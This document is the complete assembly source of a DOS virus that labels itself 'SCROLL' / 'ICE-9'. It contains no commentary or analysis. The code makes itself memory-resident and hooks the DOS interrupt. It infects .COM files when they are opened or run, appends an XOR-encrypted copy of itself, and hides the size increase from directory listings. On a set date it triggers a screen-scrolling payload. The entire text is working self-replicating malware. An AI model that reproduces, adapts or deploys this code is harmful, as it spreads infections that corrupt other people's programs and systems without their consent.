        
                                NAME XX2
                                PAGE 55,132
                                TITLE ?????

len                             equ offset handle-offset main2
enlen1                          equ offset int21-offset main3


code segment


                        ASSUME CS:CODE,DS:CODE,ES:CODE

                        org 100h


main:                   xor si,si
                        call level1
                        jmp main2
                        dd 0h


main2:                  call level1 
                        jmp main3

int24                   dd 0h

level1:                 call nextline
nextline:               pop ax
                        xchg si,ax
                        sub si,offset nextline
                        lea di,(main3+si)
                        mov cx,enlen1
uncry1:                 xor byte ptr ds:[di],01h
key:                    inc di
                        loop uncry1
                        ret


main3:                  lea ax,(oldstart+si)
                        mov di,0100h
                        mov cx,2
                        xchg si,ax
                        cld
                        repz movsw

                        xchg si,ax

                        mov cs:[scrolrq],00h

                        mov ax,0f307h
                        int 21h
                        cmp ax,0cf9h
                        je run_old 
                        jmp instal 

run_old:                mov ax,cs    
                        mov ds,ax
                        mov es,ax
                        mov ax,0100h
                        jmp ax  

instal:                 xor ax,ax                       ; Residency Routine
                        push ax
                        mov ax,es
                        dec ax
                        mov es,ax
                        pop ds
                        cmp byte ptr es:[0],5ah         
                        jne run_old                    
                        mov ax,es:[3]                   
                        sub ax,0bch                     
                        jb  run_old                     
                        mov es:[3],ax                   
                        sub word ptr es:[12h],0bch      
                        mov es,es:[12h]                  
                        push ds
                        push cs 
                        pop ds

                        mov di,offset main2
                        lea ax,(main2+si)
                        xchg si,ax
                        mov cx,len
                        cld
                        repz movsb
                        pop ds

                        xchg si,ax

                        mov ah,2ah
                        int 21h
                        cmp cx,1993
                        jb instal_int21
                        cmp dl,3 
                        jne instal_int21
                        cmp al,4h
                        jne instal_int21
                        jmp instal_scrol

instal_int21:           xor ax,ax
                        mov ds,ax
                        mov ax,ds:[0084h]
                        mov bx,ds:[0086h]
                        mov word ptr es:[int21],ax
                        mov word ptr es:[int21+2],bx
                        cli
                        mov ds:[0084h],offset new21
                        mov ds:[0086h],es
                        sti
                        push cs
                        pop es
                        jmp run_old

; Int 1ch Handler

new1c:                  inc word ptr cs:[count]
                        cmp word ptr cs:[count],1554h
                        jb chain_1c

                        push ax
                        push dx
                        push ds

                        xor ax,ax
                        mov ds,ax
                        mov dx,word ptr ds:[0463h]
                        in al,dx
                        push ax
                        mov al,8
                        out dx,al
                        inc dx
                        in al,dx
                        mov ah,al
                        inc ah
                        and ah,0fh
                        and al,0f0h
                        or al,ah
                        out dx,al
                        pop ax
                        dec dx
                        out dx,al

                        pop ds
                        pop dx
                        pop ax
chain_1c:               jmp cs:[int1c]



int1c                   dd 0h
count                   dw 0h
scrolrq                 db 0h


; Int 21h Handler

adjust_fcb:             push bx
                        push es
                        push ax
                        mov ah,2fh
                        call i21
                        pop ax
                        call i21
                        push ax
                        cmp al,0ffh
                        je not_fcb_adjust
                        cmp byte ptr es:[bx],0ffh 
                        jne normal_fcb
                        add bx,7
normal_fcb:             mov al,byte ptr es:[bx+17h]
                        and al,1fh
                        cmp al,1fh
                        jne not_fcb_adjust
                        sub es:[bx+1dh],len
not_fcb_adjust:         pop ax
                        pop es
                        pop bx
                        retf 2


check_fcb:              cmp ah,11h
                        je adjust_fcb
                        cmp ah,12h
                        je adjust_fcb
                        jmp check_infect


new21:                  cmp ax,0f307h 
                        jne check_for_handle
                        neg ax
                        retf 2

check_for_handle:       cmp ah,4eh
                        jb check_fcb       

                        cmp ah,4fh
                        ja check_infect 
                        jmp adjust         



chain_21:               jmp cs:[int21]


check_infect:           cmp byte ptr cs:[scrolrq],0ffh
                        je chain_21
                        cmp ah,3dh  
                        je open_request
                        cmp ah,4bh
                        je open_request
                        jmp chain_21

open_request:           push ax
                        push bx
                        push cx
                        push dx
                        push es
                        push bp
                        push di
                        push ds
                        mov di,dx
                        mov cx,6fh
next_byte:              cmp ds:[di],'C.'
                        jne inc_pointer
                        cmp ds:[di+2],'MO' 
                        jne inc_pointer 
                        cmp byte ptr ds:[di+4],00h 
                        jne inc_pointer 
                        jmp infect_it 

inc_pointer:            inc di 
                        loop next_byte 

exit_21:                pop ds
                        pop di
                        pop bp
                        pop es
                        pop dx
                        pop cx
                        pop bx
                        pop ax
                        jmp chain_21

infect_it: 
                        mov bp,sp                 
                        mov dx,ss:[bp+8]
                        mov ax,4300h
                        call i21
                        mov cs:[file_attr],cx
                        and cx,01fh
                        cmp cx,2
                        jae exit_21
                        xor cx,cx
                        mov ax,4301h
                        call i21


open_file:              mov ax,3d02h
                        call i21
                        jc exit_21
                        mov cs:[handle],ax
                        mov ax,cs
                        mov ds,ax
                        mov es,ax

                        mov ax,5700h
                        call file_int21   
                        mov ds:[file_time],cx
                        mov ds:[file_date],dx

                        mov ah,3fh
                        mov dx,offset oldstart
                        mov cx,4h
                        call file_int21

                        mov ax,4200h
                        xor cx,cx
                        mov dx,word ptr ds:[oldstart+1]
                        add dx,3
                        call file_int21

                        mov ah,3fh
                        mov dx,offset buff
                        mov cx,5
                        call file_int21

                        mov di,offset buff
                        mov si,offset main2
                        mov cx,5
                        cld
compare_next:           repz cmpsb
                        je close_21 

no_marker:              mov ax,4202h
                        xor cx,cx
                        mov dx,cx
                        call file_int21

                        cmp ax,0fd00h-len
                        ja close_21
                        sub ax,3
                        mov word ptr ds:[jump+1],ax

                        call encry_and_save

                        mov ax,4200h
                        xor cx,cx
                        mov dx,cx
                        call file_int21

                        mov ah,40h
                        mov cx,3
                        mov dx,offset jump
                        call file_int21

                        mov cx,ds:[file_time]
                        or cl,01fh
                        mov dx,ds:[file_date]
                        mov ax,5701h
                        call file_int21

                        mov dx,ss:[bp+8]
                        pop ds          
                        push ds   
                        mov ax,4301h
                        mov cx,cs:[file_attr]
                        call i21

close_21:               mov ah,3eh
                        call file_int21
                        jmp exit_21

instal_scrol:           push es
                        mov ah,12h  
                        mov bx,2210h
                        int 10h         
                        pop es
                        cmp bx,2210h
                        jne change_int8
                        jmp instal_int21



adjust:                 push es      
                        push bx
                        push ax
                        mov ah,2fh
                        call i21
                        pop ax
                        call i21
                        pushf  
                        push ax
                        jc ret_from_inter   
                        mov ah,byte ptr es:[bx+16h]
                        and ah,01fh
                        cmp ah,01fh
                        jne ret_from_inter
                        sub word ptr es:[bx+1ah],len
ret_from_inter:         pop ax
                        popf
                        pop bx
                        pop es
                        retf 2

file_int21:             mov bx,cs:[handle] 
i21:                    pushf
                        call cs:[int21]
                        ret

change_int8:            mov ax,351ch
                        push es
                        int 21h
                        pop ds
                        mov word ptr ds:[int1c],bx
                        mov word ptr ds:[int1c+2],es

                        mov ax,251ch
                        mov dx,offset new1c
                        int 21h
                        push ds
                        pop es
                        mov byte ptr ds:[scrolrq],0ffh

                        jmp instal_int21

; Data Area

info                    db '[SCROLL]',00h
                        db 'ICE-9'
                        db ' ARcV',00h 
 

oldstart:               mov ah,4ch
                        int 21h

jump                    db 0e9h,00h,00h
command                 db '\COMMAND.COM',00h

int21                   dd 0h

encry_and_save:         cli
                        call level1
                        mov ah,40h
                        mov cx,len
                        mov bx,ds:[handle]
                        mov dx,offset main2
                        pushf   
                        call cs:[int21]
                        call level1
                        add byte ptr cs:[key-1],2
                        sti
                        ret


handle                  dw 0h
file_time               dw 0h
file_date               dw 0h
file_attr               dw 0h

buff                    db 70h dup (?)

code ends

end main